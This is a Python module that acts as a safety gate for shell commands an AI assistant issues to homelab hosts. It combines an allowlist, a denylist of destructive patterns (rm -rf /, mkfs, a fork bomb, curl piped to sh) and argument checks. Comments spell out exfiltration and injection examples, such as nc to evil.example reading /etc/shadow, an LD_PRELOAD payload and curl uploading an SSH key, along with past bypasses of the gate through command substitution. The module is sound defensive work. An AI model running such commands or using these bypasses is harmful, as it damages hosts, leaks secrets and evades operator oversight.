"""Command classification — the gate every AI-issued shell command passes.

The model's own claim about what a command does is advisory only. A
prompt-injected or simply mistaken model would claim anything, so the
verdict comes from parsing the command here.

Three rules define the policy:

1. **Default deny.** A command whose head is not on the read-only
   allowlist is treated as ``mutating``, so a novel command never runs
   unsupervised. Being wrong in this direction costs an approval prompt;
   being wrong the other way costs a broken host.
2. **Worst segment wins.** A pipeline is classified by its most dangerous
   segment — ``cat x | sh`` is not a read.
3. **The denylist outranks everything**, including ``full_auto``. There
   is no autonomy level at which ``mkfs`` on a homelab host is intended.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass
from typing import Literal

Classification = Literal["read_only", "mutating", "denied", "unknown"]


# Command heads that only report state. Anything absent is treated as
# mutating — add here only after checking the command cannot write.
READ_ONLY_HEADS: frozenset[str] = frozenset(
    {
        # files and filesystems
        "cat",
        "head",
        "tail",
        "less",
        "more",
        "ls",
        "ll",
        "dir",
        "stat",
        "file",
        "find",
        "locate",
        "readlink",
        "realpath",
        "basename",
        "dirname",
        "wc",
        "du",
        "df",
        "tree",
        "pwd",
        "md5sum",
        "sha256sum",
        "cksum",
        "diff",
        "cmp",
        # text processing (read-only when not redirected; see _has_redirect)
        "grep",
        "egrep",
        "fgrep",
        "zgrep",
        "cut",
        "sort",
        "uniq",
        "tr",
        "column",
        "jq",
        "yq",
        "strings",
        "xxd",
        "od",
        "base64",
        "echo",
        "printf",
        # system state
        "uname",
        "hostname",
        "hostnamectl",
        "uptime",
        "date",
        "id",
        "whoami",
        "who",
        "w",
        "last",
        "lastlog",
        "groups",
        "env",
        "printenv",
        "locale",
        "lscpu",
        "lsblk",
        "lsusb",
        "lspci",
        "lsmod",
        "lsof",
        "dmidecode",
        "free",
        "vmstat",
        "iostat",
        "mpstat",
        "sar",
        "top",
        "htop",
        "ps",
        "pstree",
        "getent",
        "getconf",
        "ulimit",
        "nproc",
        "arch",
        # networking
        "ip",
        "ifconfig",
        "ss",
        "netstat",
        "route",
        "arp",
        "ping",
        "ping6",
        "traceroute",
        "tracepath",
        "mtr",
        "dig",
        "host",
        "nslookup",
        "resolvectl",
        "nc",
        "curl",
        "wget",
        "openssl",
        "nft",
        "iptables",
        "ip6tables",
        "ufw",
        # packages
        "dpkg",
        "dpkg-query",
        "apt-cache",
        "apt-mark",
        "rpm",
        "dnf",
        "yum",
        "zypper",
        "pacman",
        "snap",
        "flatpak",
        "pip",
        "pip3",
        "npm",
        "gem",
        "needrestart",
        "debsums",
        # services, logs, containers, virtualisation
        "systemctl",
        "journalctl",
        "service",
        "initctl",
        "loginctl",
        "timedatectl",
        "docker",
        "podman",
        "nerdctl",
        "kubectl",
        "crictl",
        "virsh",
        "pvesh",
        "qm",
        "pct",
        "zfs",
        "zpool",
        "btrfs",
        "smartctl",
        "mdadm",
        "cryptsetup",
        # scheduling and misc
        "crontab",
        "at",
        "atq",
        "sestatus",
        "getenforce",
        "aa-status",
        "ss",
        "true",
        "false",
        "test",
        "which",
        "type",
        "command",
        "whereis",
        "man",
    }
)

# Subcommands that make an otherwise read-only head a writer. Checked as
# (head, first-arg); a head absent from this map has no such subcommand.
MUTATING_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "systemctl": frozenset(
        {
            "start",
            "stop",
            "restart",
            "reload",
            "enable",
            "disable",
            "mask",
            "unmask",
            "isolate",
            "kill",
            "set-property",
            "daemon-reload",
            "reboot",
            "poweroff",
            "halt",
            "suspend",
            "hibernate",
            "edit",
            "set-default",
        }
    ),
    "service": frozenset({"start", "stop", "restart", "reload", "force-reload"}),
    "ip": frozenset({"add", "del", "set", "flush", "change", "replace"}),
    "nft": frozenset({"add", "delete", "flush", "insert", "replace", "create", "-f"}),
    "iptables": frozenset({"-A", "-I", "-D", "-F", "-X", "-P", "-N", "-Z", "-R"}),
    "ip6tables": frozenset({"-A", "-I", "-D", "-F", "-X", "-P", "-N", "-Z", "-R"}),
    "ufw": frozenset({"allow", "deny", "reject", "limit", "delete", "enable", "disable", "reset"}),
    "docker": frozenset(
        {
            "run",
            "rm",
            "rmi",
            "start",
            "stop",
            "restart",
            "kill",
            "exec",
            "pull",
            "push",
            "build",
            "create",
            "prune",
            "commit",
            "cp",
            "load",
            "import",
            "update",
            "compose",
            "network",
            "volume",
            "system",
            "swarm",
        }
    ),
    "podman": frozenset(
        {
            "run",
            "rm",
            "rmi",
            "start",
            "stop",
            "restart",
            "kill",
            "exec",
            "pull",
            "push",
            "build",
            "create",
            "prune",
            "commit",
            "cp",
            "load",
            "import",
        }
    ),
    "kubectl": frozenset(
        {
            "apply",
            "create",
            "delete",
            "patch",
            "replace",
            "scale",
            "edit",
            "drain",
            "cordon",
            "uncordon",
            "rollout",
            "taint",
            "annotate",
            "label",
            "exec",
            "run",
            "set",
            "expose",
            "autoscale",
        }
    ),
    "crontab": frozenset({"-r", "-e"}),
    "virsh": frozenset(
        {
            "start",
            "shutdown",
            "destroy",
            "reboot",
            "reset",
            "undefine",
            "define",
            "create",
            "suspend",
            "resume",
            "save",
            "restore",
            "setmem",
            "setvcpus",
            "attach-device",
            "detach-device",
            "vol-delete",
            "pool-destroy",
        }
    ),
    "qm": frozenset(
        {
            "start",
            "stop",
            "shutdown",
            "reset",
            "destroy",
            "set",
            "create",
            "rollback",
            "snapshot",
            "delsnapshot",
            "migrate",
            "resize",
            "clone",
        }
    ),
    "pct": frozenset(
        {
            "start",
            "stop",
            "shutdown",
            "destroy",
            "set",
            "create",
            "rollback",
            "snapshot",
            "delsnapshot",
            "migrate",
            "resize",
            "clone",
            "exec",
        }
    ),
    "zfs": frozenset({"destroy", "create", "set", "rollback", "rename", "receive", "promote"}),
    "zpool": frozenset(
        {
            "destroy",
            "create",
            "add",
            "remove",
            "replace",
            "attach",
            "detach",
            "labelclear",
            "split",
            "offline",
            "online",
        }
    ),
    "btrfs": frozenset({"delete", "create", "balance", "device", "replace"}),
    "mdadm": frozenset({"--create", "--stop", "--remove", "--fail", "--zero-superblock", "--grow"}),
    "cryptsetup": frozenset({"luksFormat", "erase", "luksRemoveKey", "luksKillSlot", "close"}),
    "pip": frozenset({"install", "uninstall", "download"}),
    "pip3": frozenset({"install", "uninstall", "download"}),
    "npm": frozenset({"install", "uninstall", "update", "publish", "ci", "link"}),
    "gem": frozenset({"install", "uninstall", "update"}),
    "snap": frozenset({"install", "remove", "refresh", "revert", "disable", "enable"}),
    "flatpak": frozenset({"install", "uninstall", "update", "remove"}),
    "dpkg": frozenset(
        {"-i", "--install", "-r", "--remove", "-P", "--purge", "--unpack", "--configure"}
    ),
    "rpm": frozenset({"-i", "-U", "-e", "--install", "--upgrade", "--erase", "--freshen"}),
    "dnf": frozenset(
        {
            "install",
            "remove",
            "erase",
            "update",
            "upgrade",
            "downgrade",
            "autoremove",
            "reinstall",
            "swap",
        }
    ),
    "yum": frozenset(
        {"install", "remove", "erase", "update", "upgrade", "downgrade", "autoremove", "reinstall"}
    ),
    "zypper": frozenset({"install", "remove", "update", "dup", "patch", "in", "rm"}),
    "pacman": frozenset({"-S", "-R", "-U", "-Syu", "-Rns", "-Sy", "-Su"}),
    "openssl": frozenset({"genrsa", "genpkey", "req", "ca", "pkcs12"}),
    "nc": frozenset({"-l", "-e"}),
    "at": frozenset({"-f"}),
}

# Never runs, at any autonomy level. Matched case-insensitively against
# each normalised pipeline segment.
DENYLIST_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"\brm\s+(-[a-z]*[rf][a-z]*\s+)+(/|/\*|/\s|$)"), "recursive delete of /"),
    (re.compile(r"\brm\s+-[a-z]*r[a-z]*f|\brm\s+-[a-z]*f[a-z]*r"), "recursive force delete"),
    (re.compile(r"\bmkfs(\.\w+)?\b"), "filesystem creation (destroys data)"),
    (
        re.compile(r"\bdd\b[^|;]*\bof=/dev/(sd|nvme|vd|hd|mmcblk|xvd)"),
        "raw write to a block device",
    ),
    (re.compile(r"\bshred\b"), "irrecoverable file destruction"),
    (re.compile(r"\bwipefs\b"), "filesystem signature wipe"),
    (re.compile(r">\s*/dev/(sd|nvme|vd|hd|mmcblk|xvd)"), "redirect over a block device"),
    (re.compile(r":\s*\(\s*\)\s*\{.*\|.*&.*\}\s*;?\s*:"), "fork bomb"),
    (re.compile(r"\bchmod\s+(-[a-z]+\s+)*0?000\s+/(\s|$)"), "stripping permissions from /"),
    (re.compile(r"\bchown\s+-R\s+\S+\s+/(\s|$)"), "recursive chown of /"),
    (re.compile(r"\b(mv|cp)\s+[^|;]*\s+/dev/null\b"), "moving data to /dev/null"),
    (re.compile(r"\bhistory\s+-c\b|\brm\b[^|;]*\.bash_history"), "clearing shell history"),
    (re.compile(r"\b(userdel|deluser)\s+(-r\s+)?root\b"), "deleting the root account"),
    (
        re.compile(
            r"\b(apt-get|apt|dnf|yum|zypper)\s+(remove|purge|erase)\b[^|;]*\b"
            r"(openssh-server|openssh|ssh|sshd|systemd|kernel|linux-image)\b"
        ),
        "removing a package LabDog or the host depends on",
    ),
    (re.compile(r"\bnft\s+flush\s+ruleset\b"), "flushing the entire nftables ruleset"),
    (re.compile(r"\biptables\s+-F\s*$"), "flushing all iptables rules"),
    (re.compile(r"\b(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba)?sh\b"), "piping a download to a shell"),
    (
        re.compile(r"\bdd\b[^|;]*\bif=/dev/(zero|urandom|random)[^|;]*\bof="),
        "overwriting a device with zeros or noise",
    ),
)

# Shutting these down takes the host — and possibly LabDog itself — off the
# network. Always gated, never auto-run.
_HALT_COMMANDS = frozenset({"shutdown", "reboot", "poweroff", "halt", "init", "telinit"})

# Splits a command line into pipeline segments. It is run over the line as
# `_unquoted_view` reads it, so an operator inside quotes is not a boundary
# (BUG-106). Over the raw line, when that reading is not available, it is
# deliberately naive about quoting: a segment boundary inside a quoted
# string yields a *more* conservative parse, never a less conservative one.
_SEGMENT_SPLIT = re.compile(r"\|\||&&|[;|&\n]")

# The `&` of an fd duplication is not a segment boundary (BUG-60).
#
# `_SEGMENT_SPLIT` breaks on `&`, so `ls -l 2>&1` became the two segments
# `ls -l 2>` and `1`. The second is headed by `1`, which is not on
# READ_ONLY_HEADS, so default-deny classified the whole line `mutating` —
# and `2>&1` is the most common idiom there is. It fails safe, but a
# read-only session refused `systemctl status sshd 2>&1`, and an approval
# session raised a prompt for it. Prompts that are obviously unnecessary
# are how an operator learns to approve without reading.
#
# Digits after the `&` are required, and that is the whole safety
# argument. Bash's `>&word` and `1>&word` forms redirect *to a file* when
# word is not a number — verified: `echo pwned 1>& /tmp/x` writes /tmp/x —
# so exempting them would turn a write into a read. `2>&word` is an
# ambiguous-redirect error. The trailing `(?=\s|$)` mirrors the same guard
# in `_REDIRECT`, so a filename that merely starts with a digit
# (`>& 2tmp`) still splits, and still reaches the redirect rule.
_FD_DUP = re.compile(r"\d*>&\s*\d+(?=\s|$)")

# Stand-in for the `&` of an fd-dup while the line is being split. NUL
# cannot appear in a command the SSH tool will run, but if one somehow
# arrives, masking is skipped rather than risking the reverse
# substitution turning a literal NUL into a `&` that escapes the split.
_FD_DUP_MARK = "\x00"

# What the shell reads as data and what it reads as syntax (BUG-106).
#
# `_SEGMENT_SPLIT` and `_REDIRECT` used to look at the raw line, so the `|`
# in `grep -E 'kubelet|kubeadm'` cut it in two — `kubeadm'` is not on
# READ_ONLY_HEADS, and default-deny called a plain read `mutating` — and
# the `>` in `grep '->'` was a redirect. A read-only session has no
# approval to fall back on, so the model simply lost `grep -E 'a|b'`.
#
# `_unquoted_view` returns the line with every character inside quotes, and
# every character a backslash escapes, replaced by `_BLANK`: same length, so
# an offset in the view is an offset in the line. Operators are looked for
# in the view and the segments are cut from the line. It follows exactly
# three things — single quotes, double quotes, backslash — and gives up on
# anything else that changes what is quoted, so the caller falls back to
# the raw line, which is the reading the classifier had before:
#
#   * an unterminated quote: there is nothing to trust;
#   * `$'…'` and `$"…"`: ANSI-C quoting lets `\'` sit inside the quotes,
#     which this does not follow, so it would close the quote early and call
#     the rest of the line data while the shell runs it;
#   * an unquoted `#`: a comment runs to the end of the line and a quote
#     character inside one opens nothing, so a reader that took it for a
#     quote would call the next line data and the shell would run it.
#
# Giving up is always safe. A view that called something data which the
# shell runs would not be, and tests/ai/test_safety_vs_bash.py checks that
# it never does by running the lines it accepts in bash.
#
# Only the segmenting and the redirect rules read the view. The denylist and
# the substitution check stay blind to quoting on purpose: `sh -c 'rm -rf /'`
# is quoted, and `"$(rm -rf /)"` still runs.
_BLANK = "."


def _unquoted_view(text: str) -> str | None:
    """*text* with quoted and escaped characters blanked out, or ``None``.

    ``None`` means the quoting is something this does not follow; see the
    note above ``_BLANK``.
    """
    view: list[str] = []
    quote = ""
    end = len(text)
    i = 0
    while i < end:
        char = text[i]
        if not quote:
            if char == "\\":
                # The next character is a literal, whatever it is.
                view.append(char if i + 1 >= end else char + _BLANK)
                i += 2
                continue
            if char == "#":
                return None
            if char in "'\"":
                if i and text[i - 1] == "$":
                    return None
                quote = char
            view.append(char)
            i += 1
        elif char == quote:
            quote = ""
            view.append(char)
            i += 1
        elif quote == '"' and char == "\\" and i + 1 < end and text[i + 1] in '$`"\\\n':
            # Inside double quotes a backslash escapes only these five;
            # before anything else it is itself a literal, as in `"a\|b"`.
            view.append(_BLANK * 2)
            i += 2
        else:
            view.append(_BLANK)
            i += 1
    return None if quote else "".join(view)


# Shell constructs that run a *second* command the classifier never sees.
#
# This is the hole that made every other rule here optional. `_SEGMENT_SPLIT`
# only breaks on `; | & \n`, and `shlex.split` keeps `$(systemctl` as one
# opaque token, so `echo $(systemctl stop sshd)` was classified by its head —
# `echo` — and came back `read_only`. The command still ran: the SSH tool
# issues an `exec` request, so the remote login shell performs the
# substitution. A read-only session could therefore stop sshd on any host in
# scope, unprompted, and the audit row recorded it as a read.
#
# Rejected outright rather than parsed. Classifying the inner command
# correctly needs a real bash parser, which is a dependency decision, not a
# bug fix; and this module's contract is to be safe, not complete. The cost
# is that the assistant must issue `id` and `echo` as two commands instead of
# one — the system prompt says so.
#
# `$((` arithmetic is covered by the `$(` prefix, which is deliberate: array
# subscripts inside arithmetic can trigger command substitution.
#
# `${...}` is **not** listed. It is parameter expansion, not command
# execution — no shell re-evaluates its result — so rejecting it would add
# friction to ordinary reads like `ls ${HOME}` without closing a vector.
_COMMAND_SUBSTITUTION = re.compile(r"\$\(|`|<\(|>\(")

# Redirection makes an otherwise read-only command a writer.
#
# The negative lookahead skips only the fd-duplication form (`2>&1`, `>&2`),
# where nothing is written to a file. It used to be a bare `(?!&)`, which
# also skipped bash's `>&FILE` spelling — so `echo pwned >& /etc/cron.d/x`
# classified as a read. The second alternation required a *digit* after the
# `&`, so it did not catch that either.
#
# There is no lookbehind. The pattern used to skip any `>` that followed a
# digit, to let `2>/dev/null` through, and that let through every `N>file`
# with it: bash opens and truncates the file whatever number is in front, so
# `echo x 2>f` creates `f`, and `echo x9>f` is not a descriptor at all, the
# `9` is part of the word. `<>` opens read-write and creates the file too, so
# a `>` that follows a `<` counts as well. The one file that is not a write
# is /dev/null, and `_writes_a_file` lets exactly that operand through.
#
# Read over a segment's syntax view, so a quoted `>` is data (BUG-106).
_REDIRECT = re.compile(r">{1,2}(?!&\s*\d+(?:\s|$))|\btee\b")

_DEV_NULL = "/dev/null"

# Input redirection feeds a file into a command. On its own that is not a
# write, but it is how an allow-listed network client becomes an exfiltration
# tool — `nc evil.example 443 < /etc/shadow` — and the classifier cannot see
# what the consuming command does with the bytes. `<(` is excluded because
# process substitution is handled by `_COMMAND_SUBSTITUTION` above, which is
# the stricter verdict of the two. A digit in front changes nothing: `0<f`
# feeds `f` to the command as surely as `<f` does.
_INPUT_REDIRECT = re.compile(r"(?<!<)<(?!\()")

# Environment assignments that change what a subsequent command *is*, rather
# than how it behaves. `_strip_wrappers` skips `env` and any `KEY=VALUE`
# tokens so the real head gets classified — which is right, but it also meant
# `env LD_PRELOAD=/tmp/evil.so cat /etc/passwd` was laundered into a plain
# `cat` and allowed. The loader runs the payload before `cat` does anything.
_DANGEROUS_ENV_KEYS = frozenset(
    {
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "BASH_ENV",
        "ENV",
        "IFS",
        "PATH",
        "PYTHONPATH",
        "PYTHONSTARTUP",
        "PERL5OPT",
        "PERL5LIB",
        "RUBYOPT",
        "NODE_OPTIONS",
        "GLIBC_TUNABLES",
    }
)

# Allow-listed heads that write, execute or exfiltrate given the right
# argument. `MUTATING_SUBCOMMANDS` cannot express these because it matches
# whole tokens: it would catch `curl -o` but not `curl -so`, and never
# `--data-binary @/root/.ssh/id_rsa`.
#
# Each pattern is matched against the segment's arguments joined by spaces.
_ARG_GATED_HEADS: dict[str, tuple[re.Pattern[str], str]] = {
    # -delete removes files; -exec/-execdir/-ok/-okdir run arbitrary
    # commands; the -f* actions write a report to a path of the caller's
    # choosing.
    "find": (
        re.compile(r"(?:^|\s)-(?:delete|exec|execdir|ok|okdir|fls|fprint|fprintf)\b"),
        "find can delete files or execute commands with these actions",
    ),
    # Short flags cluster, so match any cluster containing o/O/T rather than
    # the exact token: -o/-O write a file, -T uploads one. Long forms and
    # @file bodies are listed separately. Plain `curl URL` writes to stdout
    # and stays a read.
    "curl": (
        re.compile(
            r"(?:^|\s)-[A-Za-z]*[oOT]"
            r"|(?:^|\s)--(?:output|remote-name|upload-file|create-dirs)\b"
            r"|(?:^|\s)(?:-d|--data(?:-binary|-raw|-urlencode)?)\s*@"
        ),
        "curl can write a file or upload local data with these options",
    ),
    # wget writes to the filesystem by default — `wget URL` saves the body to
    # the current directory. Only an explicit stdout target is a read.
    "wget": (
        re.compile(r"^(?!.*(?:-O\s*-|--output-document\s*=?\s*-))"),
        "wget saves to a file unless output is sent to stdout (-O -)",
    ),
    # Scheduling a command is not reading state, whatever the payload. Gated
    # bare rather than on -f: `echo cmd | at now` never touches -f.
    "at": (re.compile(r""), "at schedules a command to run later"),
    "batch": (re.compile(r""), "batch schedules a command to run later"),
    # Outbound byte pipe. Combined with input redirection this is the
    # exfiltration primitive; on its own it is still not a read.
    "nc": (re.compile(r""), "nc opens a network connection that can carry data off the host"),
    "ncat": (re.compile(r""), "ncat opens a network connection that can carry data off the host"),
    # `crontab FILE` installs a new crontab wholesale — no flag involved.
    # Only an explicit list is a read.
    "crontab": (
        re.compile(r"^(?!.*(?:^|\s)-l\b)"),
        "crontab installs or edits a crontab unless -l is given",
    ),
    # In-place edit rewrites the file it was pointed at.
    "yq": (
        re.compile(r"(?:^|\s)-[A-Za-z]*i|(?:^|\s)--in-place\b"),
        "yq -i rewrites the file in place",
    ),
    "jq": (
        re.compile(r"(?:^|\s)--in-place\b|(?:^|\s)-[A-Za-z]*i\b"),
        "jq in-place editing rewrites the file",
    ),
    # -out writes the result (a key, a cert, an encrypted blob) to a path.
    "openssl": (
        re.compile(r"(?:^|\s)-out\b"),
        "openssl -out writes to a file",
    ),
}


@dataclass(frozen=True)
class Verdict:
    classification: Classification
    #: Human-readable justification, shown in the approval UI and returned
    #: to the model when a command is refused.
    reason: str
    #: The segment that produced the verdict, for the audit record.
    segment: str = ""

    @property
    def allowed_read_only(self) -> bool:
        return self.classification == "read_only"


def _split(command: str) -> list[tuple[str, str]]:
    """Cut *command* into pipeline segments, each with its syntax view.

    The view of a segment is what the redirect rules read: the segment with
    its quoted characters blanked out, or the segment itself when the line
    could not be read quote-aware (see ``_unquoted_view``). The two are the
    same length.

    Keeps fd-dups intact. See ``_FD_DUP``: the ``&`` in ``2>&1`` is part of
    a redirection, not a separator, and splitting on it produced a bogus
    segment headed by a digit.
    """
    nul = _FD_DUP_MARK in command
    view = None if nul else _unquoted_view(command)
    if view is None:
        view = command
    reading = view if nul else _FD_DUP.sub(lambda m: m.group(0).replace("&", _FD_DUP_MARK), view)

    segments: list[tuple[str, str]] = []
    start = 0
    for stop, resume in [
        *((m.start(), m.end()) for m in _SEGMENT_SPLIT.finditer(reading)),
        (len(command), len(command)),
    ]:
        raw = command[start:stop]
        text = raw.strip()
        if text:
            at = start + len(raw) - len(raw.lstrip())
            segments.append((text, view[at : at + len(text)]))
        start = resume
    return segments


def _segments(command: str) -> list[str]:
    """The pipeline segments of *command*, without their views."""
    return [text for text, _ in _split(command)]


def _tokenize(segment: str) -> list[str]:
    try:
        return shlex.split(segment)
    except ValueError:
        # Unbalanced quotes — fall back to whitespace so an unparseable
        # command still gets a head, and therefore still gets classified.
        return segment.split()


# `eval` and `exec` are deliberately absent. Both take the rest of the line
# and run it, so stripping them classified the *argument* as though the shell
# had not been asked to re-evaluate it. Left in place, neither is on
# READ_ONLY_HEADS, so a segment headed by one falls through to the
# default-deny branch — which is the honest answer for a construct whose
# effect depends on a round of expansion this module does not perform.
_WRAPPERS = frozenset(
    {
        "sudo",
        "doas",
        "nice",
        "ionice",
        "nohup",
        "timeout",
        "stdbuf",
        "setsid",
        "time",
        "env",
        "command",
        "builtin",
    }
)

_ENV_ASSIGNMENT = re.compile(r"([A-Za-z_][A-Za-z0-9_]*)=(.*)", re.S)


def _strip_wrappers(tokens: list[str]) -> tuple[list[str], list[str]]:
    """Drop sudo/env-style prefixes so the real command head is classified.

    Returns ``(remaining_tokens, skipped_assignments)``. The assignments are
    handed back rather than discarded because skipping them is exactly how
    an ``LD_PRELOAD=`` payload used to be laundered into a read — see
    ``_DANGEROUS_ENV_KEYS``.
    """
    idx = 0
    assignments: list[str] = []
    while idx < len(tokens) and tokens[idx] in _WRAPPERS:
        idx += 1
        # Skip the wrapper's own flags and any KEY=VALUE assignments.
        while idx < len(tokens) and (
            tokens[idx].startswith("-") or _ENV_ASSIGNMENT.fullmatch(tokens[idx])
        ):
            if not tokens[idx].startswith("-"):
                assignments.append(tokens[idx])
            idx += 1
    return tokens[idx:], assignments


# How bad each verdict is. The worst segment of a command line wins, and an
# inline shell's own redirects are weighed against its payload the same way.
_SEVERITY: dict[Classification, int] = {
    "read_only": 0,
    "unknown": 1,
    "mutating": 2,
    "denied": 3,
}


def _writes_a_file(segment: str, syntax: str) -> bool:
    """Whether *segment* redirects output to a file, or runs ``tee``.

    ``> /dev/null`` writes nothing, so it does not count. The operand is
    read from the segment itself: in the syntax view a quoted one is blanked
    out, and a quoted ``/dev/null`` is not worth recognising.
    """
    for match in _REDIRECT.finditer(syntax):
        if match.group() == "tee":
            return True
        operand = segment[match.end() :].split(None, 1)
        if not operand or operand[0] != _DEV_NULL:
            return True
    return False


def _redirect_verdict(segment: str, syntax: str) -> Verdict | None:
    """The verdict a segment's redirects earn it, if they earn it one."""
    if _writes_a_file(segment, syntax):
        return Verdict("mutating", "Output is redirected to a file", segment)
    if _INPUT_REDIRECT.search(syntax):
        return Verdict(
            "unknown",
            "Input is redirected from a file this classifier cannot inspect",
            segment,
        )
    return None


def _classify_segment(segment: str, syntax: str | None = None) -> Verdict:
    """Classify one pipeline segment.

    *syntax* is the segment as the redirect rules read it, with quoted
    characters blanked out (see ``_unquoted_view``); the segment itself when
    omitted.
    """
    if syntax is None:
        syntax = segment
    lowered = segment.lower()
    for pattern, reason in DENYLIST_PATTERNS:
        if pattern.search(lowered):
            return Verdict("denied", f"Blocked: {reason}", segment)

    # Checked before tokenising: the substituted command is invisible to
    # every rule below it.
    if _COMMAND_SUBSTITUTION.search(segment):
        return Verdict(
            "mutating",
            "Command or process substitution runs a command this classifier "
            "cannot inspect — issue the inner command separately",
            segment,
        )

    tokens, assignments = _strip_wrappers(_tokenize(segment))
    if not tokens:
        return Verdict("unknown", "Could not determine what this command runs", segment)

    for assignment in assignments:
        matched = _ENV_ASSIGNMENT.fullmatch(assignment)
        if matched and matched.group(1).upper() in _DANGEROUS_ENV_KEYS:
            return Verdict(
                "mutating",
                f"{matched.group(1)} changes what the command actually executes",
                segment,
            )

    head = tokens[0].rsplit("/", 1)[-1]
    args = tokens[1:]

    if head in _HALT_COMMANDS:
        return Verdict("mutating", f"{head} takes the host offline", segment)

    # A shell invoked with an inline script hides its real behaviour behind
    # -c, so the payload has to be classified rather than the shell.
    if head in {"sh", "bash", "zsh", "dash", "ksh", "ash"} and "-c" in args:
        payload_idx = args.index("-c") + 1
        if payload_idx < len(args):
            inner = classify_command(args[payload_idx])
            verdict = Verdict(
                inner.classification,
                f"Inline shell script: {inner.reason}",
                inner.segment or segment,
            )
            # The shell's own redirects are not part of its payload:
            # `bash -c true > f` writes `f` whatever the payload does, and
            # used to come back as the payload's verdict alone.
            redirect = _redirect_verdict(segment, syntax)
            if (
                redirect is not None
                and _SEVERITY[redirect.classification] > _SEVERITY[verdict.classification]
            ):
                return redirect
            return verdict
        return Verdict("unknown", "Shell invoked with an unreadable script", segment)

    if head in {"python", "python3", "perl", "ruby", "php", "node"} and any(
        arg in {"-c", "-e"} for arg in args
    ):
        return Verdict("mutating", f"Inline {head} script — contents not analysable", segment)

    if head not in READ_ONLY_HEADS:
        return Verdict(
            "mutating",
            f"{head!r} is not a known read-only command, so it is treated as a write",
            segment,
        )

    if mutators := MUTATING_SUBCOMMANDS.get(head):
        for arg in args:
            if arg in mutators:
                return Verdict("mutating", f"{head} {arg} changes system state", segment)

    # Argument-shape gates, for the heads whose dangerous forms cannot be
    # expressed as a set of whole tokens (clustered short flags, `@file`
    # bodies, or a bare invocation that is already a write).
    if gate := _ARG_GATED_HEADS.get(head):
        pattern, reason = gate
        if pattern.search(" ".join(args)):
            return Verdict("mutating", reason, segment)

    if (redirect := _redirect_verdict(segment, syntax)) is not None:
        return redirect

    return Verdict("read_only", f"{head} only reports state", segment)


def classify_command(command: str) -> Verdict:
    """Classify a shell command line.

    A pipeline takes the verdict of its most dangerous segment: ``denied``
    beats ``mutating`` beats ``unknown`` beats ``read_only``.
    """
    if not command or not command.strip():
        return Verdict("unknown", "Empty command", "")

    # Some denied shapes straddle a pipe — `curl … | sh` is harmless in each
    # half and hostile as a whole — so the denylist runs against the intact
    # line before it is split into segments.
    lowered = command.lower()
    for pattern, reason in DENYLIST_PATTERNS:
        if pattern.search(lowered):
            return Verdict("denied", f"Blocked: {reason}", command.strip())

    # Also checked on the intact line, not only per segment. A substitution
    # can straddle a segment boundary — `echo $(a; b)` splits into `echo $(a`
    # and `b)`, neither of which carries a balanced construct — so the
    # per-segment check alone could be walked past.
    if _COMMAND_SUBSTITUTION.search(command):
        return Verdict(
            "mutating",
            "Command or process substitution runs a command this classifier "
            "cannot inspect — issue the inner command separately",
            command.strip(),
        )

    # Seeded with None rather than a read_only placeholder. A placeholder
    # can only be displaced by something *more* severe, so a command whose
    # segments are all read-only never replaced it: every allowed command
    # came back explaining itself as "No command segments found", with an
    # empty segment — and `Verdict.segment` is what the audit record is
    # supposed to name. The classification was right throughout; only the
    # account of it was wrong, which is why nothing caught it.
    #
    # Strictly-greater is kept deliberately, so the *first* most-dangerous
    # segment still wins. Relaxing it to >= would be a one-character change
    # that silently reattributes a pipeline's verdict to a later segment.
    worst: Verdict | None = None
    for segment, syntax in _split(command):
        verdict = _classify_segment(segment, syntax)
        if worst is None or _SEVERITY[verdict.classification] > _SEVERITY[worst.classification]:
            worst = verdict
    if worst is None:
        return Verdict("unknown", "No command segments found", "")
    return worst


def is_allowed(verdict: Verdict, autonomy_level: str) -> tuple[bool, str]:
    """Decide whether a classified command may run at this autonomy level.

    Returns ``(allowed, reason)``. A False here does not always mean the
    command is refused outright — under ``approval`` the loop turns it
    into an approval request instead.
    """
    if verdict.classification == "denied":
        return False, verdict.reason
    if verdict.classification == "read_only":
        return True, verdict.reason
    if autonomy_level == "full_auto":
        return True, f"Permitted under full_auto: {verdict.reason}"
    if autonomy_level == "read_only":
        return False, (
            f"Refused: this session is read-only and the command would modify the "
            f"host ({verdict.reason})"
        )
    # "approval" — the caller converts this into an approval request.
    return False, f"Requires operator approval: {verdict.reason}"
